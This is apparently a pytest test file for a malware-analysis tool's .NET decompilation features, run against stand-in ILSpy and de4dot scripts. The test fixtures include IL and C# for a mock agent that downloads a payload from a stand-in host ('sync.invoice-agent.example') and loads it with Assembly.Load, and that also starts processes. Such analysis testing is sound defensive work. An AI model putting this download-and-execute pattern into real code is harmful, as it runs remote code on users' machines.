""".NET: readable IL listing of the prioritised methods, and the on-demand
decompilation (ILSpy CLI; de4dot only with --strtyp none) — run here against
stand-in tools (no network, no real ILSpy / de4dot needed)."""

from __future__ import annotations

import os
import stat
import sys
from pathlib import Path

import pytest

import make_samples as ms
from docutracex import dotnet
from docutracex.dotnet import decompile as dd

pytestmark = pytest.mark.skipif(sys.platform.startswith("win"), reason="stand-in tools are POSIX scripts")


def test_il_listing_is_readable() -> None:
    r = dotnet.parse(ms.dotnet_decompile_exe())
    il = {m["method"]: m["il"] for m in r["cil"]["interesting"]}
    fetch = il["InvoiceSyncAgent.Agent::Fetch"]
    assert fetch[0] == 'IL_0000: ldstr "https://sync.invoice-agent.example/stage"'
    assert "IL_000a: brfalse.s IL_000d" in fetch                    # branches as labels, IL-relative
    assert "IL_0017: callvirt System.Net.WebClient::DownloadData" in fetch
    assert "IL_001c: call System.Reflection.Assembly::Load" in fetch
    assert "IL_000a: call System.Diagnostics.Process::Start" in il["InvoiceSyncAgent.Agent::Report"]
    assert {o["name"] for o in r["obfuscators"]} == {"Dotfuscator"}


def test_de4dot_mode_never_runs_sample_code() -> None:
    args = " ".join(dd.DE4DOT_ARGS)
    assert "--strtyp none" in args and "-p un" in args
    assert "delegate" not in args and "emulate" not in args


def test_cut_method_from_type_source() -> None:
    src = """namespace InvoiceSyncAgent
{
    internal class Agent
    {
        public Agent()
        {
        }

        [STAThread]
        private static void Fetch(string u)
        {
            if (!string.IsNullOrEmpty("}{"))
            {
                Assembly.Load(new WebClient().DownloadData(u));
            }
        }

        private static void Persist()
        {
        }
    }
}"""
    code = dd.cut_method(src, "InvoiceSyncAgent.Agent", "Fetch")
    assert code.startswith("[STAThread]\nprivate static void Fetch(string u)") and code.endswith("}")
    assert "Persist" not in code and "Assembly.Load" in code
    assert dd.cut_method(src, "InvoiceSyncAgent.Agent", ".ctor").startswith("public Agent()")
    assert dd.cut_method(src, "InvoiceSyncAgent.Agent", "Missing") is None


def _script(path: Path, body: str) -> Path:
    path.write_text(f"#!{sys.executable}\n{body}", encoding="utf-8")
    path.chmod(path.stat().st_mode | stat.S_IEXEC)
    return path


@pytest.fixture()
def fake_tools(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    log = tmp_path / "calls.log"
    dotnet_exe = _script(tmp_path / "dotnet", f"""import sys, os
open({str(log)!r}, "a").write("ilspy " + " ".join(sys.argv[1:]) + " heap=" + os.environ.get("DOTNET_GCHeapHardLimit", "") + "\\n")
t = sys.argv[sys.argv.index("-t") + 1]
ns, _, name = t.rpartition(".")
print("namespace " + ns + "\\n{{\\n    internal class " + name + "\\n    {{")
for m in ("Fetch", "Report", "Persist", "Main"):
    print("        private static void " + m + "()\\n        {{\\n            // " + m + " body\\n        }}\\n")
print("    }}\\n}}")
""")
    de4dot = _script(tmp_path / "de4dot", f"""import sys, shutil
open({str(log)!r}, "a").write("de4dot " + " ".join(sys.argv[1:]) + "\\n")
shutil.copy(sys.argv[sys.argv.index("-f") + 1], sys.argv[sys.argv.index("-o") + 1])
""")
    dll = tmp_path / "ilspycmd.dll"
    dll.write_bytes(b"stand-in")
    monkeypatch.setenv("DOCUTRACEX_DOTNET", str(dotnet_exe))
    monkeypatch.setenv("DOCUTRACEX_ILSPYCMD", str(dll))
    monkeypatch.setattr(dd, "de4dot_command", lambda: [str(de4dot)])
    return log


def _case(tmp_path: Path) -> tuple[Path, Path, dict]:
    case = tmp_path / "case"
    (case / "original").mkdir(parents=True)
    exe = case / "original" / "agent.exe"
    exe.write_bytes(ms.dotnet_decompile_exe())
    res = dotnet.analyze_case(case, exe, [])
    return case, exe, res["objects"][0]


def test_decompile_prioritised_methods_through_de4dot(tmp_path: Path, fake_tools: Path) -> None:
    case, exe, obj = _case(tmp_path)
    prio = dd.priority_methods(obj)
    assert "InvoiceSyncAgent.Agent::Fetch" in prio and "InvoiceSyncAgent.Agent::Main" not in prio
    data = dd.decompile(case, exe, obj, ["InvoiceSyncAgent.Agent::Fetch", "InvoiceSyncAgent.Agent::Main"])
    ok = data["methods"]["InvoiceSyncAgent.Agent::Fetch"]
    assert ok["status"] == "ok" and ok["code"].startswith("private static void Fetch()") and "Report" not in ok["code"]
    assert data["methods"]["InvoiceSyncAgent.Agent::Main"]["status"] == "skipped"   # not prioritised
    assert data["source"] == "de4dot output" and "--strtyp none" in data["de4dot"]
    calls = fake_tools.read_text().splitlines()
    assert calls[0].startswith("de4dot -f ") and calls[0].endswith(" ".join(dd.DE4DOT_ARGS))
    assert "--disable-updatecheck -t InvoiceSyncAgent.Agent" in calls[1] and "heap=0x40000000" in calls[1]
    assert dd.load(case, obj["sha256"])["methods"]["InvoiceSyncAgent.Agent::Fetch"]["status"] == "ok"   # kept


def test_module_runs_one_ilspy_per_type(tmp_path: Path, fake_tools: Path) -> None:
    case, exe, obj = _case(tmp_path)
    data = dd.decompile(case, exe, obj, dd.priority_methods(obj))
    assert {k for k, v in data["methods"].items() if v["status"] == "ok"} == set(dd.priority_methods(obj))
    assert sum(1 for x in fake_tools.read_text().splitlines() if x.startswith("ilspy")) == 1


def test_without_ilspy_nothing_runs(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("DOCUTRACEX_DOTNET", str(tmp_path / "none"))
    monkeypatch.setattr(dd, "dotnet_executable", lambda: None)
    case, exe, obj = _case(tmp_path)
    assert not dd.ilspy_available()
    with pytest.raises(RuntimeError):
        dd.decompile(case, exe, obj, dd.priority_methods(obj))


def test_timeout_is_reported(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    slow = _script(tmp_path / "slow", "import time\ntime.sleep(30)\n")
    with pytest.raises(TimeoutError):
        dd._run([str(slow)], tmp_path, timeout=1)
    assert os.environ.get("DOTNET_GCHeapHardLimit") is None            # only the child's environment


def test_api_decompiles_only_prioritised_methods(tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
                                                  fake_tools: Path) -> None:
    import json
    import time

    from fastapi.testclient import TestClient

    from docutracex.app import create_app
    from docutracex.config import settings
    monkeypatch.setattr(settings, "cases_dir", tmp_path / "cases")
    (tmp_path / "cases").mkdir()
    c = TestClient(create_app())
    r = c.post("/api/cases", files={"file": ("agent.exe", ms.dotnet_decompile_exe())}).json()
    for _ in range(1200):
        t = next((x for x in c.get("/api/tasks").json()["tasks"] if x["id"] == r["task"]["id"]), {})
        if t.get("state") in ("completed", "failed"):
            break
        time.sleep(0.1)
    aid = r["analysis_id"]
    sha = json.loads((tmp_path / "cases" / aid / "results" / "dotnet.json").read_text())["objects"][0]["sha256"]
    base = f"/api/cases/{aid}/dotnet/{sha}"
    st = c.get(f"{base}/decompiled").json()
    assert "InvoiceSyncAgent.Agent::Fetch" in st["priority"] and st["tools"]["ilspy"]
    assert c.post(f"{base}/decompile", json={"method": "InvoiceSyncAgent.Agent::Main"}).status_code == 400
    d = c.post(f"{base}/decompile", json={"method": "InvoiceSyncAgent.Agent::Fetch"}).json()
    assert d["methods"]["InvoiceSyncAgent.Agent::Fetch"]["status"] == "ok"
    d = c.post(f"{base}/decompile", json={"module": True}).json()
    assert {k for k, v in d["methods"].items() if v["status"] == "ok"} == set(st["priority"])
